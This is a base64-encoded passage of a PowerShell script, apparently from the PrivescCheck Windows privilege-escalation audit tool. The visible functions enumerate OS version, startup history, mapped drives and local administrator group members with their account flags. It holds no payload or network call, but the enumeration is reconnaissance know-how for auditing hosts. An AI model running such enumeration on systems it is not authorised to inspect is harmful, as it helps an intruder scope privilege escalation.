tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBCRUdJTiBNSVNDICAgCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpmdW5jdGlvbiBJbnZva2UtU3lzdGVtSW5mb0NoZWNrIHsKICAgIDwjCiAgICAuU1lOT1BTSVMKCiAgICBHZXRzIHRoZSBuYW1lIG9mIHRoZSBvcGVyYXRpbmcgc3lzdGVtIGFuZCB0aGUgZnVsbCB2ZXJzaW9uIHN0cmluZy4KCiAgICBBdXRob3I6IEBpdG00bgogICAgTGljZW5zZTogQlNEIDMtQ2xhdXNlCiAgICAKICAgIC5ERVNDUklQVElPTgoKICAgIFJlYWRzIHRoZSAiUHJvZHVjdCBOYW1lIiBmcm9tIHRoZSByZWdpc3RyeSBhbmQgZ2V0cyB0aGUgZnVsbCB2ZXJzaW9uIHN0cmluZyBiYXNlZCBvbiB0aGUgCiAgICBvcGVyYXRpbmcgc3lzdGVtLgogICAgCiAgICAuRVhBTVBMRQoKICAgIEludm9rZS1TeXN0ZW1JbmZvQ2hlY2sgfCBmbAoKICAgIE5hbWUgICAgOiBXaW5kb3dzIDEwIEhvbWUKICAgIFZlcnNpb24gOiAxMC4wLjE4MzYzIFZlcnNpb24gMTkwOSAoMTgzNjMuNTM1KQogICAgCiAgICAuTElOSwoKICAgIGh0dHBzOi8vdGVjaHRob3VnaHRzLmluZm8vd2luZG93cy12ZXJzaW9uLW51bWJlcnMvCgogICAgIz4KICAgIAogICAgW0NtZGxldEJpbmRpbmcoKV0gcGFyYW0oKQoKICAgICRPc05hbWUgPSAiIgogICAgJE9zVmVyc2lvbiA9IFtTeXN0ZW0uRW52aXJvbm1lbnRdOjpPU1ZlcnNpb24uVmVyc2lvbgoKICAgICRJdGVtID0gR2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiUmVnaXN0cnk6OkhLRVlfTE9DQUxfTUFDSElORVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBOVFxDdXJyZW50VmVyc2lvbiIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgLUVycm9yVmFyaWFibGUgR2V0SXRlbVByb3BlcnR5RXJyb3IKICAgIGlmICgtbm90ICRHZXRJdGVtUHJvcGVydHlFcnJvcikgewoKICAgICAgICAkT3NOYW1lID0gJEl0ZW0uUHJvZHVjdE5hbWUKCiAgICAgICAgaWYgKCRPc1ZlcnNpb24gLWxpa2UgIjEwLioiKSB7CiAgICAgICAgICAgICMgV2luZG93cyA+PSAxMC8yMDE2CiAgICAgICAgICAgICRPc1ZlcnNpb24gPSAiJCgkSXRlbS5DdXJyZW50TWFqb3JWZXJzaW9uTnVtYmVyKS4kKCRJdGVtLkN1cnJlbnRNaW5vclZlcnNpb25OdW1iZXIpLiQoJEl0ZW0uQ3VycmVudEJ1aWxkKSBWZXJzaW9uICQoJEl0ZW0uUmVsZWFzZUlkKSAoJCgkSXRlbS5DdXJyZW50QnVpbGQpLiQoJEl0ZW0uVUJSKSkiCiAgICAgICAgfSAKCiAgICAgICAgJFN5c3RlbUluZm9SZXN1bHQgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdAogICAgICAgICRTeXN0ZW1JbmZvUmVzdWx0IHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIk5hbWUiIC1WYWx1ZSAkT3NOYW1lCiAgICAgICAgJFN5c3RlbUluZm9SZXN1bHQgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiVmVyc2lvbiIgLVZhbHVlICRPc1ZlcnNpb24KICAgICAgICAkU3lzdGVtSW5mb1Jlc3VsdAoKICAgIH0gZWxzZSB7CiAgICAgICAgV3JpdGUtVmVyYm9zZSAkR2V0SXRlbVByb3BlcnR5RXJyb3IKICAgIH0KfQoKZnVuY3Rpb24gSW52b2tlLVN5c3RlbVN0YXJ0dXBIaXN0b3J5Q2hlY2sgewogICAgPCMKICAgIC5TWU5PUFNJUwoKICAgIEdldHMgYSBsaXN0IG9mIGFsbCB0aGUgc3lzdGVtIHN0YXJ0dXAgZXZlbnRzIHdoaWNoIG9jY3VycmVkIGluIHRoZSBnaXZlbiB0aW1lIHNwYW4uCgogICAgQXV0aG9yOiBAaXRtNG4KICAgIExpY2Vuc2U6IEJTRCAzLUNsYXVzZQogICAgCiAgICAuREVTQ1JJUFRJT04KCiAgICBJdCB1c2VzIHRoZSBFdmVudCBMb2cgdG8gZ2V0IGEgbGlzdCBvZiBhbGwgdGhlIGV2ZW50cyB0aGF0IGluZGljYXRlIGEgc3lzdGVtIHN0YXJ0dXAuIFRoZSBzdGFydAogICAgZXZlbnQgb2YgdGhlIEV2ZW50IExvZyBzZXJ2aWNlIGlzIHVzZWQgYXMgYSByZWZlcmVuY2UuCiAgICAKICAgIC5QQVJBTUVURVIgVGltZVNwYW5JbkRheXMKCiAgICBBbiBvcHRpb25hbCBwYXJhbWV0ZXIgaW5kaWNhdGluZyB0aGUgdGltZSBzcGFuIHRvIGNoZWNrIGluIGRheXMuIGUuZy46IGNoZWNrIHRoZSBsYXN0IDMxIGRheXMuCiAgICAKICAgIC5FWEFNUExFCgogICAgUFMgQzpcPiBJbnZva2UtU3lzdGVtU3RhcnR1cEhpc3RvcnlDaGVjawoKICAgIEluZGV4IFRpbWUKICAgIC0tLS0tIC0tLS0KICAgICAgICAgMSAyMDIwLTAxLTExIC0gMjE6MzY6NTkKICAgICAgICAgMiAyMDIwLTAxLTA4IC0gMDg6NDU6MDEKICAgICAgICAgMyAyMDIwLTAxLTA3IC0gMTE6NDU6NDMKICAgICAgICAgNCAyMDIwLTAxLTA2IC0gMTQ6NDM6NDEKICAgICAgICAgNSAyMDIwLTAxLTA1IC0gMjM6MDc6NDEKICAgICAgICAgNiAyMDIwLTAxLTA1IC0gMTE6NDE6MzkKICAgICAgICAgNyAyMDIwLTAxLTA0IC0gMTQ6MTg6NDYKICAgICAgICAgOCAyMDIwLTAxLTA0IC0gMTQ6MTg6MTAKICAgICAgICAgOSAyMDIwLTAxLTA0IC0gMTI6NTE6NTEKICAgICAgICAxMCAyMDIwLTAxLTAzIC0gMTA6NDE6MTUKICAgICAgICAxMSAyMDE5LTEyLTI3IC0gMTM6NTc6MzAKICAgICAgICAxMiAyMDE5LTEyLTI2IC0gMTA6NTY6MzgKICAgICAgICAxMyAyMDE5LTEyLTI1IC0gMTI6MTI6MTQKICAgICAgICAxNCAyMDE5LTEyLTI0IC0gMTc6NDE6MDQKICAgIAogICAgLk5PVEVTCgogICAgRXZlbnQgSUQgNjAwNTogVGhlIEV2ZW50IGxvZyBzZXJ2aWNlIHdhcyBzdGFydGVkLCBpLmUuIHN5c3RlbSBzdGFydHVwIHRoZW9yZXRpY2FsbHkuCgogICAgIz4KICAgIAogICAgW0NtZGxldEJpbmRpbmcoKV0gcGFyYW0oCiAgICAgICAgW2ludF0KICAgICAgICAkVGltZVNwYW5JbkRheXMgPSAzMQogICAgKQoKICAgIHRyeSB7CiAgICAgICAgJFN5c3RlbVN0YXJ0dXBIaXN0b3J5UmVzdWx0ID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdAoKICAgICAgICAkU3RhcnREYXRlID0gKEdldC1EYXRlKS5BZGREYXlzKC0kVGltZVNwYW5JbkRheXMpCiAgICAgICAgJEVuZERhdGUgPSBHZXQtRGF0ZQoKICAgICAgICAkU3RhcnR1cEV2ZW50cyA9IEdldC1FdmVudExvZyAtTG9nTmFtZSAiU3lzdGVtIiAtRW50cnlUeXBlICJJbmZvcm1hdGlvbiIgLUFmdGVyICRTdGFydERhdGUgLUJlZm9yZSAkRW5kRGF0ZSB8IFdoZXJlLU9iamVjdCB7JF8uRXZlbnRJRCAtZXEgNjAwNX0KCiAgICAgICAgJEV2ZW50TnVtYmVyID0gMQoKICAgICAgICBGb3JFYWNoICgkRXZlbnQgaW4gJFN0YXJ0dXBFdmVudHMpIHsKICAgICAgICAgICAgJFN5c3RlbVN0YXJ0dXBIaXN0b3J5SXRlbSA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFBTT2JqZWN0IAogICAgICAgICAgICAkU3lzdGVtU3RhcnR1cEhpc3RvcnlJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiSW5kZXgiIC1WYWx1ZSAkRXZlbnROdW1iZXIKICAgICAgICAgICAgJFN5c3RlbVN0YXJ0dXBIaXN0b3J5SXRlbSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlRpbWUiIC1WYWx1ZSAiJChDb252ZXJ0LURhdGVUb1N0cmluZyAtRGF0ZSAkRXZlbnQuVGltZUdlbmVyYXRlZCkiCiAgICAgICAgICAgIFt2b2lkXSRTeXN0ZW1TdGFydHVwSGlzdG9yeVJlc3VsdC5BZGQoJFN5c3RlbVN0YXJ0dXBIaXN0b3J5SXRlbSkKICAgICAgICAgICAgJEV2ZW50TnVtYmVyICs9IDEKICAgICAgICB9CgogICAgICAgICRTeXN0ZW1TdGFydHVwSGlzdG9yeVJlc3VsdCB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDEwCiAgICB9IGNhdGNoIHsKICAgICAgICAjIFdlIG1pZ2h0IGdldCBhbiAiYWNjZXMgZGVuaWVkIgogICAgICAgIFdyaXRlLVZlcmJvc2UgIkVycm9yIHdoaWxlIHF1ZXJ5aW5nIHRoZSBFdmVudCBMb2cuIgogICAgfQp9CgpmdW5jdGlvbiBJbnZva2UtU3lzdGVtU3RhcnR1cENoZWNrIHsKICAgIDwjCiAgICAuU1lOT1BTSVMKICAgIAogICAgR2V0cyB0aGUgbGFzdCBzeXN0ZW0gc3RhcnR1cCB0aW1lCiAgICAKICAgIEF1dGhvcjogQGl0bTRuCiAgICBMaWNlbnNlOiBCU0QgMy1DbGF1c2UKICAgIAogICAgLkRFU0NSSVBUSU9OCgogICAgR2V0cyB0aGUgdGlja2NvdW50IGluIG1pbGxpc2Vjb25kcyB0aGFua3MgdG8gdGhlIEdldFRpY2tDb3VudDY0IFdpbjMyIGZ1bmN0aW9uIGFuZCBzdWJzdHJhY3RzCiAgICB0aGUgdmFsdWUgdG8gdGhlIGN1cnJlbnQgZGF0ZS4gVGhpcyB5aWVsZHMgdGhlIGRhdGUgYW5kIHRpbWUgb2YgdGhlIGxhc3Qgc3lzdGVtIHN0YXJ0dXAuIFRoZSAKICAgIHJlc3VsdCBpcyByZXR1cm5lZCBpbiBhIGN1c3RvbSBQUyBPYmplY3QgY29udGFpbmluZyBhIHN0cmluZyByZXByZXNlbnRhdGlvbiBvZiB0aGUgRGF0ZVRpbWUKICAgIG9iamVjdC4gCiAgICAKICAgIC5FWEFNUExFCgogICAgUFMgQzpcPiBJbnZva2UtU3lzdGVtU3RhcnR1cENoZWNrCgogICAgVGltZQogICAgLS0tLQogICAgMjAyMC0wMS0xMSAtIDIxOjM2OjQxCgogICAgLk5PVEVTCgogICAgW0Vudmlyb25tZW50XTo6VGlja0NvdW50IGlzIGEgMzItYml0IHNpZ25lZCBpbnRlZ2VyCiAgICBUaGUgbWF4IHZhbHVlIGl0IGNhbiBob2xkIGlzIDQ5LjcgZGF5cy4gVGhhdCdzIHdoeSBHZXRUaWNrQ291bnQ2NCgpIGlzIHVzZWQgaW5zdGVhZC4KICAgIAogICAgIz4KICAgIAogICAgW0NtZGxldEJpbmRpbmcoKV0gcGFyYW0oKSAKCiAgICB0cnkgewogICAgICAgICRUaWNrY291bnRNaWxsaXNlY29uZHMgPSBbUHJpdmVzY0NoZWNrLldpbjMyXTo6R2V0VGlja0NvdW50NjQoKQoKICAgICAgICAkU3RhcnR1cERhdGUgPSAoR2V0LURhdGUpLkFkZE1pbGxpc2Vjb25kcygtJFRpY2tjb3VudE1pbGxpc2Vjb25kcykKCiAgICAgICAgJFN5c3RlbVN0YXJ0dXBSZXN1bHQgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdAogICAgICAgICRTeXN0ZW1TdGFydHVwUmVzdWx0IHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiVGltZSIgLVZhbHVlICIkKENvbnZlcnQtRGF0ZVRvU3RyaW5nIC1EYXRlICRTdGFydHVwRGF0ZSkiCiAgICAgICAgJFN5c3RlbVN0YXJ0dXBSZXN1bHQKICAgIAogICAgfSBjYXRjaCB7CiAgICAgICAgIyBXZSBhcmUgZGVhbGluZyB3aXRoIHRoZSBXaW5kb3dzIEFQSSBzbyBsZXQncyBzaWxlbnRseSBjYXRjaCBhbnkgZXhjZXB0aW9uLCBqdXN0IGluIGNhc2UuLi4KICAgIH0KfQoKZnVuY3Rpb24gSW52b2tlLVN5c3RlbURyaXZlc0NoZWNrIHsKICAgIDwjCiAgICAuU1lOT1BTSVMKCiAgICBHZXRzIGEgbGlzdCBvZiBsb2NhbCBkcml2ZXMgYW5kIG5ldHdvcmsgc2hhcmVzIHRoYXQgYXJlIGN1cnJlbnRseSBtYXBwZWQKCiAgICBBdXRob3I6IEBpdG00bgogICAgTGljZW5zZTogQlNEIDMtQ2xhdXNlCiAgICAKICAgIC5ERVNDUklQVElPTgoKICAgIFRoaXMgZnVuY3Rpb24gaXMgYSB3cmFwcGVyIGZvciB0aGUgIkdldC1QU0RyaXZlIiBzdGFuZGFyZCBjbWRsZXQuIEZvciBlYWNoIHJlc3VsdCByZXR1cm5lZCBieSAKICAgICJHZXQtUFNEcml2ZSIsIGEgY3VzdG9tIFBTIG9iamVjdCBpcyByZXR1cm5lZCwgaW5kaWNhdGluZyB0aGUgZHJpdmUgbGV0dGVyIChpZiBhcHBsaWNhYmxlKSwgdGhlCiAgICBkaXNwbGF5IG5hbWUgKGlmIGFwcGxpY2FibGUpIGFuZCB0aGUgZGVzY3JpcHRpb24uCiAgICAKICAgIC5FWEFNUExFCgogICAgUFMgQzpcPiBJbnZva2UtU3lzdGVtRHJpdmVzQ2hlY2sgCgogICAgUm9vdCBEaXNwbGF5Um9vdCBEZXNjcmlwdGlvbgogICAgLS0tLSAtLS0tLS0tLS0tLSAtLS0tLS0tLS0tLQogICAgQzpcICAgICAgICAgICAgICBPUwogICAgRTpcICAgICAgICAgICAgICBEQVRBCiAgICAjPgogICAgCiAgICBbQ21kbGV0QmluZGluZygpXSBwYXJhbSgpCgogICAgJFN5c3RlbURyaXZlc1Jlc3VsdCA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKCiAgICAkRHJpdmVzID0gR2V0LVBTRHJpdmUgLVBTUHJvdmlkZXIgIkZpbGVTeXN0ZW0iCgogICAgRm9yRWFjaCAoJERyaXZlIGluICREcml2ZXMpIHsKICAgICAgICAkRHJpdmVJdGVtID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgUFNPYmplY3QKICAgICAgICAkRHJpdmVJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiUm9vdCIgLVZhbHVlICIkKCREcml2ZS5Sb290KSIKICAgICAgICAkRHJpdmVJdGVtIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiRGlzcGxheVJvb3QiIC1WYWx1ZSAiJCgkRHJpdmUuRGlzcGxheVJvb3QpIgogICAgICAgICREcml2ZUl0ZW0gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJEZXNjcmlwdGlvbiIgLVZhbHVlICIkKCREcml2ZS5EZXNjcmlwdGlvbikiCiAgICAgICAgW3ZvaWRdJFN5c3RlbURyaXZlc1Jlc3VsdC5BZGQoW29iamVjdF0kRHJpdmVJdGVtKQogICAgfQoKICAgICRTeXN0ZW1Ecml2ZXNSZXN1bHQKfQoKZnVuY3Rpb24gSW52b2tlLUxvY2FsQWRtaW5Hcm91cENoZWNrIHsKICAgIDwjCiAgICAuU1lOT1BTSVMKCiAgICBFbnVtZXJhdGVzIHRoZSBtZW1iZXJzIG9mIHRoZSBkZWZhdWx0IGxvY2FsIGFkbWluIGdyb3VwCgogICAgQXV0aG9yOiBAaXRtNG4KICAgIExpY2Vuc2U6IEJTRCAzLUNsYXVzZQogICAgCiAgICAuREVTQ1JJUFRJT04KCiAgICBGb3IgZXZlcnkgbWVtYmVyIG9mIHRoZSBsb2NhbCBhZG1pbiBncm91cCwgaXQgd2lsbCBjaGVjayB3aGV0aGVyIGl0J3MgYSBsb2NhbC9kb21haW4gdXNlci9ncm91cC4KICAgIElmIGl0J3MgbG9jYWwgaXQgd2lsbCBhbHNvIGNoZWNrIGlmIHRoZSBhY2NvdW50IGlzIGVuYWJsZWQuIAogICAgCiAgICAuRVhBTVBMRQoKICAgIFBTIEM6XD4gSW52b2tlLUxvY2FsQWRtaW5Hcm91cENoZWNrCgogICAgTmFtZSAgICAgICAgICBUeXBlIElzTG9jYWwgSXNFbmFibGVkCiAgICAtLS0tICAgICAgICAgIC0tLS0gLS0tLS0tLSAtLS0tLS0tLS0KICAgIEFkbWluaXN0cmF0b3IgVXNlciAgICBUcnVlICAgICBGYWxzZQogICAgbGFiLWFkbWluICAgICBVc2VyICAgIFRydWUgICAgICBUcnVlCiAgICAKICAgIC5OT1RFUwoKICAgIFMtMS01LTMyLTU0NCA9IFNJRCBvZiB0aGUgbG9jYWwgYWRtaW4gZ3JvdXAgCgogICAgIz4KCiAgICBbQ21kbGV0QmluZGluZygpXSBwYXJhbSgpCgogICAgZnVuY3Rpb24gR2V0LVVzZXJGbGFncyB7CiAgICAgICAgcGFyYW0oCiAgICAgICAgICAgICRVc2VyRmxhZ3MKICAgICAgICApCgogICAgICAgICRVc2VyRmxhZ3NFbnVtID0gQHsKICAgICAgICAgICAgIkFEU19VRl9TQ1JJUFQiID0gIjEiOwogICAgICAgICAgICAiQURTX1VGX0FDQ09VTlRESVNBQkxFIiA9ICIyIjsKICAgICAgICAgICAgIkFEU19VRl9IT01FRElSX1JFUVVJUkVEIiA9ICI4IjsKICAgICAgICAgICAgIkFEU19VRl9MT0NLT1VUIiA9ICIxNiI7CiAgICAgICAgICAgICJBRFNfVUZfUEFTU1dEX05PVFJFUUQiID0gIjMyIjsKICAgICAgICAgICAgIkFEU19VRl9QQVNTV0RfQ0FOVF9DSEFOR0UiID0gIjY0IjsKICAgICAgICAgICAgIkFEU19VRl9FTkNSWVBURURfVEVYVF9QQVNTV09SRF9BTExPV0VEIiA9ICIxMjgiOwogICAgICAgICAgICAiQURTX1VGX1RFTVBfRFVQTElDQVRFX0FDQ09VTlQiID0gIjI1NiI7CiAgICAgICAgICAgICJBRFNfVUZfTk9STUFMX0FDQ09VTlQiID0gIjUxMiI7CiAgICAgICAgICAgICJBRFNfVUZfSU5URVJET01BSU5fVFJVU1RfQUNDT1VOVCIgPSAiMjA0OCI7CiAgICAgICAgICAgICJBRFNfVUZfV09SS1NUQVRJT05fVFJVU1RfQUNDT1VOVCIgPSAiNDA5NiI7CiAgICAgICAgICAgICJBRFNfVUZfU0VSVkVSX1RSVVNUX0FDQ09VTlQiID0gIjgxOTIiOwogICAgICAgICAgICAiQURTX1VGX0RPTlRfRVhQSVJFX1BBU1NXRCIgPSAiNjU1MzYiOwogICAgICAgICAgICAiQURTX1VGX01OU19MT0dPTl9BQ0NPVU5UIiA9ICIxMzEwNzIiOwogICAgICAgICAgICAiQURTX1VGX1NNQVJUQ0FSRF9SRVFVSVJFRCIgPSAiMjYyMTQ0IjsKICAgICAgICAgICAgIkFEU19VRl9UUlVTVEVEX0ZPUl9ERUxFR0FUSU9OIiA9ICI1MjQyODgiOwogICAgICAgICAgICAiQURTX1VGX05PVF9ERUxFR0FURUQiID0gIjEwNDg1NzYiOwogICAgICAgICAgICAiQURTX1VGX1VTRV9ERVNfS0VZX09OTFkiID0gIjIwOTcxNTIiOwogICAgICAgICAgICAiQURTX1VGX0RPTlRfUkVRVUlSRV9QUkVBVVRIIiA9ICI0MTk0MzA0IjsKICAgICAgICAgICAgIkFEU19VRl9QQVNTV09SRF9FWFBJUkVEIiA9ICI4Mzg4NjA4IjsKICAgICAgICAgICAgIkFEU19VRl9UUlVTVEVEX1RPX0FVVEhFTlRJQ0FURV9GT1JfREVMRUdBVElPTiIgPSAiMTY3NzcyMTYiOwogICAgICAgIH0KCiAgICAgICAgJFVzZXJGbGFnc0VudW0uR2V0RW51bWVyYXRvcigpIHwgRm9yRWFjaC1PYmplY3QgeyAKICAgICAgICAgICAgaWYgKCAkXy52YWx1ZSAtYmFuZCAkVXNlckZsYWdzICkgCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRfLm5hbWUKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICBmdW5jdGlvbiBHZXQtR3JvdXBGbGFncyB7CiAgICAgICAgcGFyYW0oCiAgICAgICAgICAgICRHcm91cEZsYWdzCiAgICAgICAgKQogICAgICAgICMgaHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvb3BlbnNwZWNzL3dpbmRvd3NfcHJvdG9jb2xzL21zLWFkdHMvMTE5NzIyNzItMDllYy00YTQyLWJmNWUtM2U5OWIzMjFjZjU1CiAgICAgICAgJEdyb3VwRmxhZ3NFbnVtID0gQHsKICAgICAgICAgICAgIkFEU19HUk9VUF9UWVBFX0JVSUxUSU5fTE9DQUxfR1JPVVAiID0gIjEiOyAjIFNwZWNpZmllcyBhIGdyb3VwIHRoYXQgaXMgY3JlYXRlZCBieSB0aGUgc3lzdGVtLgogICAgICAgICAgICAiQURTX0dST1VQX1RZUEVfQUNDT1VOVF9HUk9VUCIgPSAiMiI7ICMgU3BlY2lmaWVzIGEgZ2xvYmFsIGdyb3VwLgogICAgICAgICAgICAiQURTX0dST1VQX1RZUEVfUkVTT1VSQ0VfR1JPVVAiID0gIjQiOyAjIFNwZWNpZmllcyBhIGRvbWFpbiBsb2NhbCBncm91cC4KICAgICAgICAgICAgIkFEU19HUk9VUF9UWVBFX1VOSVZFUlNBTF9HUk9VUCIgPSAiOCI7ICMgU3BlY2lmaWVzIGEgdW5pdmVyc2FsIGdyb3VwLgogICAgICAgICAgICAiQURTX0dST1VQX1RZUEVfQVBQX0JBU0lDX0dST1VQIiA9ICIxNiI7CiAgICAgICAgICAgICJBRFNfR1JPVVBfVFlQRV9BUFBfUVVFUllfR1JPVVAiID0gIjMyIjsKICAgICAgICAgICAgIkFEU19HUk9VUF9UWVBFX1NFQ1VSSVRZX0VOQUJMRUQiID0gIjIxNDc0ODM2NDgiOyAjIFNwZWNpZmllcyBhIHNlY3VyaXR5LWVuYWJsZWQgZ3JvdXAuCiAgICAgICAgfQoKICAgICAgICAkR3JvdXBGbGFnc0VudW0uR2V0RW51bWVyYXRvcigpIHwgRm9yRWFjaC1PYmplY3QgeyAKICAgICAgICAgICAgaWYgKCRfLnZhbHVlIC1iYW5kICRHcm91cEZsYWdzKSAKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJF8ubmFtZQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgICRMb2NhbEFkbWluR3JvdXBTaWQgPSAiUy0xLTUtMzItNTQ0IiAjIExvY2FsIGFkbWluIGdyb3VwIFNJRCAKICAgICRMb2NhbEFkbWluR3JvdXBGdWxsbmFtZSA9IChbU2VjdXJpdHkuUHJpbmNpcGFsLlNlY3VyaXR5SWRlbnRpZmllcl0kTG9jYWxBZG1pbkdyb3VwU2lkKS5UcmFuc2xhdGUoW1NlY3VyaXR5LlByaW5jaXBhbC5OVEFjY291bnRdKS5WYWx1ZQogICAgJExvY2FsQWRtaW5Hcm91cE5hbWUgPSAkTG9jYWxBZG1pbkdyb3VwRnVsbG5hbWUuU3BsaXQoJ1wnKVsxXQoKICAgICRDb21wdXRlciA9ICRlbnY6Q09NUFVURVJOQU1FCiAgICAkQWRzaUNvbXB1dGVyID0gW0FEU0ldKCJXaW5OVDovLyRDb21wdXRlcixjb21wdXRlciIpIAoKICAgIHRyeSB7CiAgICAgICAgJExvY2FsQWRtaW5Hcm91cCA9ICRBZHNpQ29tcHV0ZXIucHNiYXNlLmNoaWxkcmVuLmZpbmQoJExvY2FsQWRtaW5Hcm91cE5hbWUsICJHcm91cCIpIAoKICAgICAgICBpZiAoJExvY2FsQWRtaW5Hcm91cCkgewogICAgICAgICAgICAkTG9jYWxBZG1pbkdyb3VwLnBzYmFzZS5pbnZva2UoIm1lbWJlcnMiKSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICMgRm9yIGVhY2ggbWVtYmVyIG9mIHRoZSBsb2NhbCBhZG1pbiBncm91cCAKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgJE1lbWJlck5hbWUgPSAkXy5HZXRUeXBlKCkuSW52b2tlTWVtYmVyKCJOYW1lIiwgICdHZXRQcm9wZXJ0eScsICAkbnVsbCwgICRfLCAkbnVsbCkKICAgICAgICAgICAgICAgICRNZW1iZXIgPSAkTnVsbAoKICAgICAgICAgICAgICAgICMgSXMgaXQgYSBsb2NhbCB1c2VyPwogICAgICAgICAgICAgICAgJEFkc2lDb21wdXRlci5DaGlsZHJlbiB8IFdoZXJlLU9iamVjdCB7ICRfLlNjaGVtYUNsYXNzTmFtZSAtZXEgIlVzZXIiIH0gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCRfLk5hbWUgLWVxICRNZW1iZXJOYW1lKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkZvdW5kIHVzZXI6ICRNZW1iZXJOYW1lIgogICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyID0gJF8KICAgICAgICAgICAgICAgICAgICB9IAogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICMgaWYgaXQncyBub3QgYSBsb2NhbCB1c2VyLCBpcyBpdCBhIGxvY2FsIGdyb3AgPwogICAgICAgICAgICAgICAgaWYgKC1ub3QgJElzTG9jYWwpIHsKICAgICAgICAgICAgICAgICAgICAkQWRzaUNvbXB1dGVyLkNoaWxkcmVuIHwgV2hlcmUtT2JqZWN0IHsgJF8uU2NoZW1hQ2xhc3NOYW1lIC1lcSAiR3JvdXAiIH0gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkXy5OYW1lIC1lcSAkTWVtYmVyTmFtZSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiRm91bmQgZ3JvdXA6ICRNZW1iZXJOYW1lIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlciA9ICRfCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYgKCRNZW1iZXIpIHsKICAgICAgICAgICAgICAgICAgICBpZiAoJE1lbWJlci5TY2hlbWFDbGFzc05hbWUgLWVxICJVc2VyIikgewogICAgICAgICAgICAgICAgICAgICAgICAkVXNlckZsYWdzID0gJE1lbWJlci5Vc2VyRmxhZ3MudmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgJEZsYWdzID0gR2V0LVVzZXJGbGFncyAkVXNlckZsYWdzIAogICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyVHlwZSA9ICJVc2VyIgogICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVySXNMb2NhbCA9ICRUcnVlCiAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJJc0VuYWJsZWQgPSAkKC1ub3QgKCRGbGFncyAtY29udGFpbnMgIkFEU19VRl9BQ0NPVU5URElTQUJMRSIpKQogICAgICAgICAgICAgICAgICAgIH0gZWxzZWlmICgkTWVtYmVyLlNjaGVtYUNsYXNzTmFtZSAtZXEgIkdyb3VwIikgewogICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBUeXBlID0gJE1lbWJlci5ncm91cFR5cGUudmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgJEZsYWdzID0gR2V0LUdyb3VwRmxhZ3MgJEdyb3VwVHlwZQogICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyVHlwZSA9ICJHcm91cCIKICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlcklzTG9jYWwgPSAkKCRGbGFncyAtY29udGFpbnMgIkFEU19HUk9VUF9UWVBFX1JFU09VUkNFX0dST1VQIikKICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlcklzRW5hYmxlZCA9ICRUcnVlIAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJE1lbWJlclR5cGUgPSAiIgogICAgICAgICAgICAgICAgICAgICRNZW1iZXJJc0xvY2FsID0gJEZhbHNlCiAgICAgICAgICAgICAgICAgICAgJE1lbWJlcklzRW5hYmxlZCA9ICROdWxsIAogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICRMb2NhbEFkbWluR3JvdXBSZXN1bHRJdGVtID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgUFNPYmplY3QgCiAgICAgICAgICAgICAgICAkTG9jYWx